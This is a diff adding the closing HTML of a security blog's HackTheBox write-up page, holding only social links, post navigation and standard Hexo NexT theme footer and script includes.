+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/09/09/little-tommy/" rel="prev" title="Hack-The-Box-pwn-challenge[little_tommy]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-pwn-challenge[little_tommy]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/09/14/mprotect-and-shellcode/" rel="next" title="ROP Exploit MProtect() and Shellcode">
+                  ROP Exploit MProtect() and Shellcode <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
